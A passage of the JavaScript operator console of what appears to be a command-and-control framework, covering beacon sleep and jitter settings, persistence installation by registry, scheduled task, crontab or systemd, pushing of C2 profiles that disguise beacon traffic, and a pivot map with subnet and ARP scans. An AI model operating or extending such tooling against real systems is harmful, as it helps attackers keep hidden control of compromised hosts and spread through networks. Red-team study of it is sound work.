        <span id="cfg-jitter-val" style="color:var(--text);font-size:12px;width:36px">10%</span>
      </div>
      <button onclick="applySleepConfig()" style="margin-top:4px;padding:8px 20px;background:var(--red-dim);color:#fff;border:none;border-radius:5px;cursor:pointer;font-size:12px;font-family:var(--sans)">Apply Sleep</button>
      <div style="margin-top:24px">
        <div class="t-info" style="margin-bottom:12px">&#128274; Persistence</div>
        <div style="color:var(--text2);font-size:11px;margin-bottom:10px">Install autostart persistence on the target. Method is auto-detected based on OS if set to auto.</div>
        <div style="display:flex;gap:10px;align-items:center;margin-bottom:8px">
          <label style="color:var(--text2);font-size:12px;width:70px">Method</label>
          <select id="cfg-persist-method" style="flex:1;background:rgba(0,0,0,0.5);border:1px solid var(--border);border-radius:4px;padding:6px 10px;color:var(--text);font-family:var(--mono);font-size:12px">
            <option value="auto">auto (detect OS)</option>
            <option value="registry">registry (HKCU Run)</option>
            <option value="startup">startup folder (VBS)</option>
            <option value="schtask">scheduled task</option>
            <option value="crontab">crontab @reboot</option>
            <option value="bashrc">.bashrc</option>
            <option value="systemd">systemd user service</option>
          </select>
        </div>
        <div style="display:flex;gap:8px;margin-top:8px">
          <button onclick="applyPersist()" style="padding:8px 20px;background:var(--green-dim);color:#fff;border:none;border-radius:5px;cursor:pointer;font-size:12px;font-family:var(--sans)">Install</button>
          <button onclick="removePersist()" style="padding:8px 20px;background:rgba(255,255,255,0.06);color:var(--text);border:1px solid var(--border);border-radius:5px;cursor:pointer;font-size:12px;font-family:var(--sans)">Remove</button>
        </div>
      </div>
      <div style="margin-top:24px">
        <div class="t-info" style="margin-bottom:12px">&#128737; C2 Profile</div>
        <div id="cfg-agent-profile" style="margin-bottom:14px"></div>
        <div style="border-top:1px solid rgba(255,255,255,0.06);padding-top:12px;margin-bottom:8px">
          <div style="color:var(--text2);font-size:11px;margin-bottom:8px;font-weight:600">Push New Profile</div>
          <div id="cfg-profile-status" style="font-size:11px;color:var(--text2);margin-bottom:8px"></div>
          <div style="display:flex;gap:10px;align-items:center;margin-bottom:8px">
            <label style="color:var(--text2);font-size:12px;width:70px">Profile</label>
            <select id="cfg-profile-select" style="flex:1;background:rgba(0,0,0,0.5);border:1px solid var(--border);border-radius:4px;padding:6px 10px;color:var(--text);font-family:var(--mono);font-size:12px">
              <option value="active">Active server profile</option>
            </select>
          </div>
          <div style="display:flex;gap:8px;margin-top:8px;flex-wrap:wrap">
            <button onclick="pushProfileToAgent()" style="padding:8px 16px;background:rgba(197,134,192,0.15);color:#c586c0;border:1px solid rgba(197,134,192,0.4);border-radius:5px;cursor:pointer;font-size:12px;font-family:var(--sans)">&#128225; Push to this Agent</button>
            <button onclick="pushProfileToAll()" style="padding:8px 16px;background:rgba(255,26,26,0.08);color:var(--red);border:1px solid rgba(255,26,26,0.3);border-radius:5px;cursor:pointer;font-size:12px;font-family:var(--sans)">&#128225; Push to All</button>
            <button onclick="showC2ProfileEditor()" style="padding:8px 16px;background:rgba(255,255,255,0.06);color:var(--text);border:1px solid var(--border);border-radius:5px;cursor:pointer;font-size:12px;font-family:var(--sans)">&#9998; Editor</button>
          </div>
        </div>
      </div>
      <div style="margin-top:24px">
        <div class="t-info" style="margin-bottom:8px">&#128163; Kill Agent</div>
        <div style="color:var(--text2);font-size:11px;margin-bottom:10px">Terminate the beacon process on the target.</div>
        <button onclick="if(confirm('Kill agent '+selectedAgent+'?'))quickCmd('kill','')" style="padding:8px 20px;background:#661111;color:#ff6666;border:1px solid #882222;border-radius:5px;cursor:pointer;font-size:12px;font-family:var(--sans)">Kill Beacon</button>
      </div>
    </div>
  `);
  // Show agent's current profile from beacon telemetry
  const ap = document.getElementById("cfg-agent-profile");
  if(ap){
    const prof = info.c2_profile;
    if(prof && prof.active){
      const tbl = (label, val) => '<div style="display:flex;gap:6px;padding:2px 0;font-size:11px"><span style="color:var(--text2);min-width:90px">'+label+'</span><span style="color:var(--text);word-break:break-all">'+esc(String(val))+'</span></div>';
      const tagList = (items, color) => items.map(i => '<span style="display:inline-block;font-size:9px;padding:1px 6px;border-radius:3px;background:rgba('+color+',0.12);color:rgba('+color+',1);margin:1px 2px">'+esc(i)+'</span>').join("");
      let html = '<div style="background:rgba(197,134,192,0.06);border:1px solid rgba(197,134,192,0.2);border-radius:6px;padding:10px 12px">';
      html += '<div style="font-size:11px;font-weight:600;color:#c586c0;margin-bottom:6px">&#10004; Agent Profile Active</div>';
      if(prof.useragent) html += tbl("User-Agent", prof.useragent);
      html += tbl("Interval", prof.interval+"s");
      html += tbl("Jitter", prof.jitter+"%");
      if(prof.get_uris && prof.get_uris.length){
        html += '<div style="padding:4px 0 2px;font-size:10px;color:var(--text2);font-weight:600">GET URIs</div>';
        html += tagList(prof.get_uris, "86,156,198");
      }
      if(prof.post_uris && prof.post_uris.length){
        html += '<div style="padding:4px 0 2px;font-size:10px;color:var(--text2);font-weight:600">POST URIs</div>';
        html += tagList(prof.post_uris, "206,145,120");
      }
      if(prof.get_headers && prof.get_headers.length){
        html += '<div style="padding:4px 0 2px;font-size:10px;color:var(--text2);font-weight:600">GET Headers</div>';
        html += tagList(prof.get_headers, "78,201,176");
      }
      if(prof.post_headers && prof.post_headers.length){
        html += '<div style="padding:4px 0 2px;font-size:10px;color:var(--text2);font-weight:600">POST Headers</div>';
        html += tagList(prof.post_headers, "78,201,176");
      }
      if(prof.metadata_config){
        const mc = prof.metadata_config;
        let mstr = (mc.transforms||[]).join(" → ");
        if(mc.prepend) mstr += ' prepend="'+mc.prepend+'"';
        if(mc.terminator) mstr += " → "+mc.terminator.type+(mc.terminator.name?" "+mc.terminator.name:"");
        if(mstr) html += tbl("Metadata", mstr);
      }
      if(prof.id_config){
        const ic = prof.id_config;
        let istr = (ic.transforms||[]).join(" → ");
        if(ic.terminator) istr += " → "+ic.terminator.type+(ic.terminator.name?" "+ic.terminator.name:"");
        if(istr) html += tbl("Beacon ID", istr);
      }
      html += '</div>';
      ap.innerHTML = html;
    } else {
      ap.innerHTML = '<div style="font-size:11px;color:var(--orange);padding:8px 0">&#9888; No C2 profile active on this agent — using default random evasion headers</div>';
    }
  }
  // Show last raw HTTP request from this beacon (proof that profile is applied)
  const lr = info._last_request;
  if(lr && ap){
    const tbl = (label, val) => '<div style="display:flex;gap:6px;padding:2px 0;font-size:11px"><span style="color:var(--text2);min-width:90px">'+label+'</span><span style="color:var(--text);word-break:break-all;font-family:monospace">'+esc(String(val))+'</span></div>';
    let rhtml = '<div style="background:rgba(86,156,198,0.06);border:1px solid rgba(86,156,198,0.2);border-radius:6px;padding:10px 12px;margin-top:10px">';
    rhtml += '<div style="font-size:11px;font-weight:600;color:#569cd6;margin-bottom:6px">&#128225; Last Beacon HTTP Request</div>';
    rhtml += tbl("Path", lr.path);
    rhtml += tbl("User-Agent", lr.user_agent);
    rhtml += tbl("Time", lr.ts);
    if(lr.headers){
      const skip = new Set(["User-Agent","Content-Type"]);
      const extra = Object.entries(lr.headers).filter(([k])=>!skip.has(k));
      if(extra.length){
        rhtml += '<div style="padding:4px 0 2px;font-size:10px;color:var(--text2);font-weight:600">Custom Headers</div>';
        extra.forEach(([k,v])=>{ rhtml += tbl(k, v); });
      }
    }
    const profActive = info.c2_profile && info.c2_profile.active;
    const isProfilePath = lr.path && !lr.path.startsWith("/beacon") && !lr.path.startsWith("/api/beacon") && lr.path !== "/";
    const isProfileUA = lr.user_agent && lr.user_agent.includes("Slackbot") || (lr.user_agent && !["Mozilla","python-urllib"].some(s=>lr.user_agent.includes(s)));
    if(profActive && isProfilePath){
      rhtml += '<div style="margin-top:8px;padding:6px 10px;background:rgba(78,201,120,0.1);border:1px solid rgba(78,201,120,0.25);border-radius:4px;font-size:10px;color:#4ec978">&#10004; Profile is actively applied — beacon is using C2 profile URI <b>'+esc(lr.path)+'</b> instead of default paths</div>';
    } else if(profActive){
      rhtml += '<div style="margin-top:8px;padding:6px 10px;background:rgba(206,145,50,0.1);border:1px solid rgba(206,145,50,0.25);border-radius:4px;font-size:10px;color:#ce9132">&#9888; Profile is configured but request path looks like a default — check if beacon received the profile</div>';
    }
    rhtml += '</div>';
    ap.innerHTML += rhtml;
  }
  // Populate server profile status
  api("/api/server/c2-profile/active").then(d => {
    const status = document.getElementById("cfg-profile-status");
    if(status){
      if(d.active){
        const cfg = d.config||{};
        const nGet = (cfg.http_get?.uris||[]).length;
        const nPost = (cfg.http_post?.uris||[]).length;
        let s = '<span style="color:var(--green)">&#10004; Ready to push</span>';
        if(cfg.useragent) s += ' — '+esc(cfg.useragent.substring(0,50));
        if(nGet||nPost) s += ' ('+nGet+' GET, '+nPost+' POST)';
        status.innerHTML = s;
      } else {
        status.innerHTML = '<span style="color:var(--text2)">No server profile saved — open the editor first</span>';
      }
    }
  }).catch(()=>{});
  // Populate library dropdown
  const sel = document.getElementById("cfg-profile-select");
  if(sel && typeof C2PE_LIBRARY !== "undefined"){
    C2PE_LIBRARY.forEach((p,i) => {
      const opt = document.createElement("option");
      opt.value = i;
      opt.textContent = p.icon+" "+p.name;
      sel.appendChild(opt);
    });
  }
}

function applySleepConfig(){
  const interval = document.getElementById("cfg-interval").value;
  const jitter = document.getElementById("cfg-jitter").value;
  quickCmd("sleep", interval+" "+jitter);
  toast("info","Beacon Config","Sleep set to "+interval+"s / jitter "+jitter+"%",3000);
}

function applyPersist(){
  const method = document.getElementById("cfg-persist-method").value;
  quickCmd("persist", method, "Persistence");
  toast("info","Persistence","Installing via "+method+"...",3000);
}

function removePersist(){
  const method = document.getElementById("cfg-persist-method").value;
  quickCmd("unpersist", method, "Unpersist");
  toast("warning","Persistence","Removing via "+method+"...",3000);
}

async function pushProfileToAgent(){
  if(!selectedAgent) return;
  const sel = document.getElementById("cfg-profile-select");
  const val = sel ? sel.value : "active";
  if(val === "active"){
    try{
      const check = await api("/api/server/c2-profile/active");
      if(!check.active){
        toast("warn","C2 Profile","No active profile — open the editor and save one first",4000);
        return;
      }
      const data = await api("/api/server/c2-profile/push",{
        method:"POST", body:JSON.stringify({agent_ids:[selectedAgent]})
      });
      if(data.error){ toast("err","C2 Profile",data.error,4000); return; }
      toast("ok","C2 Profile","Profile pushed to "+selectedAgent,3000);
    }catch(e){ toast("err","C2 Profile","Push failed: "+e.message,4000); }
  } else {
    const lib = typeof C2PE_LIBRARY !== "undefined" ? C2PE_LIBRARY : [];
    const profile = lib[parseInt(val)];
    if(!profile) return;
    try{
      const saveResp = await api("/api/server/c2-profile/save",{
        method:"POST", body:JSON.stringify({source: profile.source})
      });
      if(saveResp.error){ toast("err","C2 Profile",saveResp.error,4000); return; }
      const data = await api("/api/server/c2-profile/push",{
        method:"POST", body:JSON.stringify({agent_ids:[selectedAgent]})
      });
      toast("ok","C2 Profile","Pushed '"+profile.name+"' to "+selectedAgent,3000);
    }catch(e){ toast("err","C2 Profile","Push failed: "+e.message,4000); }
  }
}

async function pushProfileToAll(){
  try{
    const sel = document.getElementById("cfg-profile-select");
    const val = sel ? sel.value : "active";
    if(val !== "active"){
      const lib = typeof C2PE_LIBRARY !== "undefined" ? C2PE_LIBRARY : [];
      const profile = lib[parseInt(val)];
      if(profile){
        await api("/api/server/c2-profile/save",{
          method:"POST", body:JSON.stringify({source: profile.source})
        });
      }
    }
    const check = await api("/api/server/c2-profile/active");
    if(!check.active){
      toast("warn","C2 Profile","No active profile — save one first",4000);
      return;
    }
    if(!confirm("Push C2 profile to ALL connected agents?")) return;
    const data = await api("/api/server/c2-profile/push",{
      method:"POST", body:JSON.stringify({})
    });
    if(data.error){ toast("err","C2 Profile",data.error,4000); return; }
    toast("ok","C2 Profile","Profile pushed to "+data.count+" agent(s)",3000);
  }catch(e){ toast("err","C2 Profile","Push failed: "+e.message,4000); }
}

// ── Log viewers ──
let logPollTimer = null;
let logFilter = "";

function renderLogEntries(entries, container){
  container.innerHTML = entries.map(e => {
    const ts = (e.ts||"").replace("T"," ").replace("Z","");
    return '<div class="log-entry">'
      + '<span class="log-ts">'+esc(ts)+'</span>'
      + '<span class="log-cat '+esc(e.cat||"")+'">'+esc(e.cat||"?")+'</span>'
      + (e.agent ? '<span class="log-agent">'+esc(e.agent)+'</span>' : '')
      + '<span class="log-msg">'+esc(e.msg||"")+'</span>'
      + '</div>';
  }).join("") || '<div style="color:var(--text2);padding:20px;text-align:center">No log entries yet</div>';
  container.scrollTop = container.scrollHeight;
}

function showServerLog(){
  const drawer = document.getElementById("srvlog-drawer");
  if(drawer.classList.contains("open")){ closeSrvLog(); return; }
  if(logPollTimer){ clearInterval(logPollTimer); logPollTimer=null; }
  logFilter = "";
  const ctrl = document.getElementById("srvlog-controls");
  ctrl.innerHTML = '<button class="active" onclick="setLogFilter(\'\')">All</button>'
    +'<button onclick="setLogFilter(\'REGISTER\')">Register</button>'
    +'<button onclick="setLogFilter(\'RECONNECT\')">Reconnect</button>'
    +'<button onclick="setLogFilter(\'TASK\')">Task</button>'
    +'<button onclick="setLogFilter(\'DISPATCH\')">Dispatch</button>'
    +'<button onclick="setLogFilter(\'RESULT\')">Result</button>'
    +'<button onclick="setLogFilter(\'DOWNLOAD\')">Download</button>'
    +'<button onclick="setLogFilter(\'STARTUP\')">Startup</button>'
    +'<span style="flex:1"></span>'
    +'<button onclick="refreshServerLog()">&#8635;</button>';
  drawer.classList.add("open");
  refreshServerLog();
  logPollTimer = setInterval(refreshServerLog, 5000);
}

function closeSrvLog(){
  document.getElementById("srvlog-drawer").classList.remove("open");
  if(logPollTimer){ clearInterval(logPollTimer); logPollTimer=null; }
}

async function refreshServerLog(){
  const url = "/api/logs/server" + (logFilter ? "?cat="+logFilter : "");
  const entries = await api(url);
  const container = document.getElementById("srvlog-body");
  if(container) renderLogEntries(entries, container);
}

function setLogFilter(cat){
  logFilter = cat;
  document.querySelectorAll(".srvlog-controls button").forEach(b => {
    const isCat = (cat === "" && b.textContent === "All") ||
                  b.textContent.toUpperCase() === cat;
    b.classList.toggle("active", isCat);
  });
  refreshServerLog();
}

async function showAgentLog(){
  if(logPollTimer){ clearInterval(logPollTimer); logPollTimer=null; }
  if(!selectedAgent){
    toast("warn","Log","Select an agent first",3000);
    return;
  }
  const agentName = selectedAgent;
  openPanel("Agent Log: " + agentName, `
    <div class="log-controls">
      <span style="color:var(--green);font-weight:700;font-size:12px">` + esc(agentName) + `</span>
      <span style="flex:1"></span>
      <button onclick="refreshAgentLog()">&#8635; Refresh</button>
    </div>
    <div id="log-entries" style="flex:1;overflow-y:auto;min-height:0"></div>
  `);
  refreshAgentLog();
  logPollTimer = setInterval(refreshAgentLog, 5000);
}

async function refreshAgentLog(){
  if(!selectedAgent) return;
  const entries = await api("/api/logs/agent/"+selectedAgent);
  const container = document.getElementById("log-entries");
  if(container) renderLogEntries(entries, container);
}

// ── Pivot map ──
let pivotScanData = {};
let pivotNodes = [];
let pivotDrag = null;
let pivotPan = {x:0, y:0};
let pivotPanStart = null;
let pivotZoom = 1;
let pivotAnimId = null;
let pivotTime = 0;
let pivotDidDrag = false;

if(!CanvasRenderingContext2D.prototype.roundRect){
  CanvasRenderingContext2D.prototype.roundRect = function(x,y,w,h,r){
    r = Math.min(r||0, w/2, h/2);
    this.moveTo(x+r, y);
    this.lineTo(x+w-r, y);
    this.arcTo(x+w, y, x+w, y+r, r);
    this.lineTo(x+w, y+h-r);
    this.arcTo(x+w, y+h, x+w-r, y+h, r);
    this.lineTo(x+r, y+h);
    this.arcTo(x, y+h, x, y+h-r, r);
    this.lineTo(x, y+r);
    this.arcTo(x, y, x+r, y, r);
    this.closePath();
  };
}

async function showPivotMap(){
  if(!selectedAgent) return;
  pivotZoom = 1;
  pivotPan = {x:0, y:0};
  const info = await api("/api/agents/"+selectedAgent);
  const allAgents = await api("/api/agents");

  if(!pivotScanData[selectedAgent]){
    const stored = await api("/api/agents/"+selectedAgent+"/scan");
    if(stored && stored.length) pivotScanData[selectedAgent] = stored;
  }

  openPanel("Pivot Map", `
    <div class="pivot-controls">
      <button onclick="runNetScan()">&#128269; Scan Subnet</button>
      <button onclick="runArpScan()">&#128203; ARP Table</button>
      <button onclick="showNxcMenu(this)">&#9876; NXC Scan</button>
      <button onclick="refreshPivotMap()">&#8635; Refresh</button>
      <span style="flex:1"></span>
      <button onclick="pivotZoomIn()" title="Zoom in">&#10133;</button>
      <button onclick="pivotFitAll()" title="Fit all">&#9635;</button>
      <button onclick="pivotZoomOut()" title="Zoom out">&#10134;</button>
      <a href="https://benjitrapp.github.io/raccoon-route/" target="_blank" rel="noopener" style="padding:5px 12px;background:rgba(255,255,255,0.04);color:var(--text2);border:1px solid var(--border);border-radius:4px;font-size:11px;text-decoration:none;display:flex;align-items:center;gap:4px;transition:all 0.15s" onmouseover="this.style.borderColor='var(--red-dim)';this.style.color='var(--red)'" onmouseout="this.style.borderColor='';this.style.color=''">&#128214; Raccoon Route</a>
    </div>
    <div class="pivot-legend">
      <span><span class="dot" style="background:var(--red);box-shadow:0 0 6px var(--red)"></span> C2 Server</span>
      <span><span class="dot" style="background:var(--green);box-shadow:0 0 6px var(--green)"></span> Beacon</span>
      <span><span class="dot" style="background:#FFD700;box-shadow:0 0 6px #FFD700"></span> Selected</span>
      <span><span class="dot" style="background:#5588cc"></span> Discovered</span>
      <span><span class="dot" style="background:#555"></span> Offline</span>
      <span style="margin-left:auto;color:var(--text2);font-size:10px" id="pivot-zoom-label">100%</span>
    </div>
    <div style="position:relative;flex:1;min-height:0">
      <canvas class="pivot-canvas" id="pivot-canvas" width="800" height="500"></canvas>
      <div id="pivot-tooltip-wrap" style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:10"></div>
    </div>
  `, "pivot");

  buildPivotGraph(info, allAgents);
  setTimeout(pivotFitAll, 50);
}

function buildPivotGraph(currentInfo, allAgents){
  pivotNodes = [];
  const cx = 400, cy = 250;

  pivotNodes.push({
    id: "c2-server", type: "c2", x: cx, y: 60,
    label: "C2 Server", sub: window.location.host,
    color: "#ff1a1a", glow: "rgba(255,26,26,0.5)"
  });

  const agentOnline = allAgents.filter(a => a.status !== "offline");
  const agentOffline = allAgents.filter(a => a.status === "offline");
  const totalAgents = allAgents.length;
  const angleStep = totalAgents > 0 ? (Math.PI * 0.8) / Math.max(totalAgents, 1) : 0;
  const startAngle = Math.PI * 0.1;

  allAgents.forEach((a, i) => {
    const angle = startAngle + angleStep * i;
    const radius = 160;
    const x = cx + Math.cos(angle + Math.PI/2) * radius * 1.5;
    const y = 60 + Math.sin(angle + Math.PI/2) * radius + 40;
    const isSelected = a.agent_id === selectedAgent;
    const isOnline = a.status !== "offline";
    let col = isSelected ? "#FFD700" : (isOnline ? "#33ff33" : "#555");
    let glow = isSelected ? "rgba(255,215,0,0.5)" : (isOnline ? "rgba(51,255,51,0.4)" : "none");
    const ips = (a.local_ips || currentInfo.local_ips || []).join(", ");
    pivotNodes.push({
      id: a.agent_id, type: "beacon", x, y,
      label: a.agent_id,
      sub: (a.user||"?")+"@"+(a.hostname||"?") + (ips ? "\n"+ips : ""),
      color: col, glow, status: a.status,
      link: "c2-server"
    });
  });

  const scanKey = selectedAgent || "";
  const scanResults = pivotScanData[scanKey] || [];
  const agentIps = new Set();
  allAgents.forEach(a => (a.local_ips||[]).forEach(ip => agentIps.add(ip)));

  const discovered = scanResults.filter(h => !agentIps.has(h.ip));
  if(discovered.length > 0){
    const beaconNode = pivotNodes.find(n => n.id === selectedAgent);
    const bx = beaconNode ? beaconNode.x : cx;
    const by = beaconNode ? beaconNode.y : cy;

    const boxPad = 35;
    const nodeSpacing = 80;
    const cols = Math.min(discovered.length, 4);
    const rows = Math.ceil(discovered.length / cols);
    const boxW = cols * nodeSpacing + boxPad * 2;
    const boxH = rows * nodeSpacing + boxPad * 2 + 24;
    const boxX = bx - boxW / 2;
    const boxY = by + 70;

    const subnet = discovered[0].ip.split(".").slice(0,3).join(".")+".0/24";
    pivotNodes.push({
      id: "subnet-"+scanKey, type: "subnet",
      x: boxX, y: boxY, w: boxW, h: boxH,
      label: subnet, beaconId: selectedAgent
    });

    discovered.forEach((h, i) => {
      const col = i % cols;
      const row = Math.floor(i / cols);
      const x = boxX + boxPad + col * nodeSpacing + nodeSpacing / 2;
      const y = boxY + boxPad + 24 + row * nodeSpacing + nodeSpacing / 2;
      const hasServices = h.ports && h.ports.length > 0;
      const hasOS = !!h.os_guess;
      let nodeColor = "#5588cc";
      if(hasOS && h.os_guess.includes("Windows")) nodeColor = "#4499dd";
      else if(hasOS && h.os_guess.includes("Linux")) nodeColor = "#55bb55";
      else if(hasOS && (h.os_guess.includes("macOS")||h.os_guess.includes("Apple"))) nodeColor = "#aaaaaa";
      else if(hasOS && h.os_guess.includes("Network")) nodeColor = "#dd8833";
      else if(hasOS && h.os_guess.includes("NAS")) nodeColor = "#bb66cc";
      const shortLabel = h.hostname ? h.hostname.split(".")[0] : h.ip.split(".").slice(2).join(".");
      pivotNodes.push({
        id: "host-"+h.ip, type: "host", x, y,
        label: shortLabel,
        sub: h.vendor || "",
        color: nodeColor, glow: nodeColor.replace(")", ",0.3)").replace("rgb","rgba"),
        link: selectedAgent,
        hostData: h
      });
    });
  }

  drawPivotCanvas();
}

function startPivotAnim(){
  if(pivotAnimId) return;
  function loop(ts){
    pivotTime = ts;
    drawPivotFrame();
    pivotAnimId = requestAnimationFrame(loop);
  }
  pivotAnimId = requestAnimationFrame(loop);
}

function stopPivotAnim(){
  if(pivotAnimId){ cancelAnimationFrame(pivotAnimId); pivotAnimId=null; }
}

function drawPivotCanvas(){
  startPivotAnim();
}

function drawPivotFrame(){
  const canvas = document.getElementById("pivot-canvas");
  if(!canvas){ stopPivotAnim(); return; }
  if(!canvas.offsetParent){ stopPivotAnim(); return; }
  const par = canvas.parentElement;
  const w = par.clientWidth || 800;
  const h = par.clientHeight || 400;
  if(canvas.width !== w) canvas.width = w;
  if(canvas.height !== h) canvas.height = h;
  const ctx = canvas.getContext("2d");
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  ctx.save();
  ctx.translate(pivotPan.x, pivotPan.y);
  ctx.scale(pivotZoom, pivotZoom);
  const t = pivotTime * 0.001;
  const mono = getComputedStyle(document.body).getPropertyValue("--mono");
  const sans = getComputedStyle(document.body).getPropertyValue("--sans");

  const edges = [];
  const subnetBeacons = new Set();
  pivotNodes.filter(n => n.type === "subnet").forEach(sn => subnetBeacons.add(sn.beaconId));

  pivotNodes.forEach(n => {
    if(!n.link) return;
    if(n.type === "host" && subnetBeacons.has(n.link)) return;
    const parent = pivotNodes.find(p => p.id === n.link);
    if(!parent) return;
    edges.push({from:parent, to:n, node:n});
  });

  pivotNodes.filter(n => n.type === "subnet").forEach(sn => {
    const beacon = pivotNodes.find(p => p.id === sn.beaconId);
    if(!beacon) return;
    const toX = sn.x + sn.w / 2;
    const toY = sn.y;
    edges.push({from:beacon, to:{x:toX, y:toY}, node:{type:"subnet-link", status:"online"}});
  });

  edges.forEach(e => {
    const n = e.node;
    const x1=e.from.x, y1=e.from.y, x2=e.to.x, y2=e.to.y;
    const offline = n.status === "offline";
    const isHost = n.type === "host" || n.type === "subnet-link";
    const lineColor = offline ? "rgba(85,85,85,0.4)" : (isHost ? "rgba(85,136,204,0.7)" : "rgba(255,26,26,0.8)");
    const glowColor = offline ? "transparent" : (isHost ? "rgba(85,136,204,0.25)" : "rgba(255,26,26,0.3)");
    const dashOff = t * (isHost ? 30 : 50);

    if(!offline){
      ctx.save();
      ctx.beginPath();
      ctx.moveTo(x1, y1);
      ctx.lineTo(x2, y2);
      ctx.strokeStyle = glowColor;
      ctx.lineWidth = 10;
      ctx.lineCap = "round";
      ctx.shadowColor = glowColor;
      ctx.shadowBlur = 18;
      ctx.setLineDash([]);
      ctx.stroke();
      ctx.restore();
    }

    ctx.save();
    ctx.beginPath();
    ctx.moveTo(x1, y1);
    ctx.lineTo(x2, y2);
    ctx.strokeStyle = lineColor;
    ctx.lineWidth = offline ? 1 : (isHost ? 2 : 2.5);
    ctx.lineCap = "round";
    if(isHost){
      ctx.setLineDash([6, 6]);
      ctx.lineDashOffset = -dashOff;
    } else {
      ctx.setLineDash([]);
    }
    ctx.stroke();
    ctx.restore();

    if(!offline){
      ctx.save();
      ctx.beginPath();
      ctx.moveTo(x1, y1);
      ctx.lineTo(x2, y2);
      ctx.strokeStyle = offline ? "transparent" : "rgba(255,255,255,0.15)";
      ctx.lineWidth = isHost ? 1 : 1.2;
      ctx.lineCap = "round";
      ctx.setLineDash([2, 12]);
      ctx.lineDashOffset = -dashOff * 1.5;
      ctx.stroke();
      ctx.restore();
    }

    if(!offline){
      const dx = x2-x1, dy = y2-y1;
      const len = Math.sqrt(dx*dx+dy*dy);
      if(len < 10) return;
      const nx = dx/len, ny = dy/len;
      const speed = isHost ? 0.3 : 0.5;
      const packetCount = isHost ? 1 : 2;
      const pktColor = isHost ? "rgba(85,136,204,0.9)" : "rgba(255,100,100,0.95)";
      const pktGlow = isHost ? "rgba(85,136,204,0.5)" : "rgba(255,26,26,0.6)";
      for(let p=0; p<packetCount; p++){
        const phase = (t * speed + p * (1.0/packetCount)) % 1.0;
        const px = x1 + dx * phase;
        const py = y1 + dy * phase;
        ctx.save();
        ctx.shadowColor = pktGlow;
        ctx.shadowBlur = 8;
        ctx.beginPath();
        ctx.arc(px, py, 3, 0, Math.PI*2);
        ctx.fillStyle = pktColor;
        ctx.fill();
        ctx.restore();
      }
    }
  });

  // ── Subnet boxes ──
  pivotNodes.filter(n => n.type === "subnet").forEach(sn => {
    const bx = sn.x, by = sn.y, bw = sn.w, bh = sn.h;
    const dashOff = t * 20;

    ctx.save();
    ctx.shadowColor = "rgba(85,136,204,0.2)";
    ctx.shadowBlur = 20;
    ctx.fillStyle = "rgba(10,18,35,0.55)";
    ctx.beginPath();
    ctx.roundRect(bx, by, bw, bh, 10);
    ctx.fill();
    ctx.restore();

    ctx.save();
    ctx.strokeStyle = "rgba(85,136,204,0.5)";
    ctx.lineWidth = 1.5;
    ctx.setLineDash([8, 5]);
    ctx.lineDashOffset = -dashOff;
    ctx.beginPath();
    ctx.roundRect(bx, by, bw, bh, 10);
    ctx.stroke();
    ctx.restore();

    ctx.save();
    ctx.strokeStyle = "rgba(85,136,204,0.15)";
    ctx.lineWidth = 4;
    ctx.setLineDash([]);
    ctx.shadowColor = "rgba(85,136,204,0.15)";
    ctx.shadowBlur = 12;
    ctx.beginPath();
    ctx.roundRect(bx, by, bw, bh, 10);
    ctx.stroke();
    ctx.restore();

    ctx.font = "bold 10px " + sans;
    ctx.fillStyle = "rgba(85,136,204,0.8)";
    ctx.textAlign = "left";
    ctx.fillText("🌐 " + sn.label, bx + 10, by + 14);

    const hostCount = pivotNodes.filter(n => n.type === "host" && n.link === sn.beaconId).length;
    ctx.font = "9px " + mono;
    ctx.fillStyle = "rgba(85,136,204,0.5)";
    ctx.textAlign = "right";
    ctx.fillText(hostCount + " device" + (hostCount !== 1 ? "s" : ""), bx + bw - 10, by + 14);
  });

  // ── Nodes ──
  pivotNodes.forEach(n => {
    if(n.type === "subnet") return;
    const r = n.type === "c2" ? 22 : (n.type === "beacon" ? 18 : 12);
    const pulse = 1 + Math.sin(t * 2) * 0.08;
    const rr = n.type === "host" ? r : r * pulse;

    if(n.glow && n.glow !== "none"){
      ctx.save();
      const grad = ctx.createRadialGradient(n.x, n.y, rr*0.5, n.x, n.y, rr*2.2);
      grad.addColorStop(0, n.glow);
      grad.addColorStop(1, "transparent");
      ctx.beginPath();
      ctx.arc(n.x, n.y, rr*2.2, 0, Math.PI*2);
      ctx.fillStyle = grad;
      ctx.fill();
      ctx.restore();
    }

    ctx.save();
    ctx.shadowColor = n.glow || "transparent";
    ctx.shadowBlur = 12;
    ctx.beginPath();
    ctx.arc(n.x, n.y, rr, 0, Math.PI*2);
    ctx.fillStyle = n.color;
    ctx.fill();
    ctx.shadowBlur = 0;
    ctx.restore();

    ctx.beginPath();
    ctx.arc(n.x, n.y, rr, 0, Math.PI*2);
    ctx.strokeStyle = "rgba(255,255,255,0.2)";
    ctx.lineWidth = 1.5;
    ctx.stroke();

    if(n.type === "c2"){
      ctx.font = "16px serif";
      ctx.fillStyle = "#fff";
      ctx.textAlign = "center";
      ctx.fillText("🦝", n.x, n.y + 5);
    } else if(n.type === "beacon"){
      ctx.font = "bold 10px " + mono;
      ctx.fillStyle = "#000";
      ctx.textAlign = "center";
      ctx.fillText("B", n.x, n.y + 4);
    } else {
      ctx.font = "9px " + mono;
      ctx.fillStyle = "#fff";
      ctx.textAlign = "center";
      ctx.fillText("H", n.x, n.y + 3);
    }

    ctx.font = (n.type === "host" ? "10px " : "bold 11px ") + sans;
    ctx.fillStyle = n.color;
    ctx.textAlign = "center";
    if(n.type !== "host"){
      ctx.shadowColor = n.color;
      ctx.shadowBlur = 6;
    }
    ctx.fillText(n.label, n.x, n.y + rr + 12);
    ctx.shadowBlur = 0;

    if(n.sub){
      ctx.font = "9px " + mono;
      ctx.fillStyle = "rgba(208,212,220,0.5)";
      const subLines = n.sub.split("\n");
      subLines.forEach((line, i) => {
        ctx.fillText(line, n.x, n.y + rr + 23 + i * 11);
      });
    }
  });

  ctx.restore();

  if(!canvas._eventsAttached){
    canvas._eventsAttached = true;
    canvas.addEventListener("mousedown", pivotMouseDown);
    canvas.addEventListener("mousemove", pivotMouseMove);
    canvas.addEventListener("mouseup", pivotMouseUp);
    canvas.addEventListener("mouseleave", pivotMouseUp);
    canvas.addEventListener("wheel", pivotWheel, {passive:false});
    canvas.addEventListener("click", pivotClick);
  }
}

function pivotScreenToWorld(sx, sy){
  return { x: (sx - pivotPan.x) / pivotZoom, y: (sy - pivotPan.y) / pivotZoom };
}

function pivotMouseDown(e){
  pivotDidDrag = false;
  const canvas = e.target;
  const rect = canvas.getBoundingClientRect();
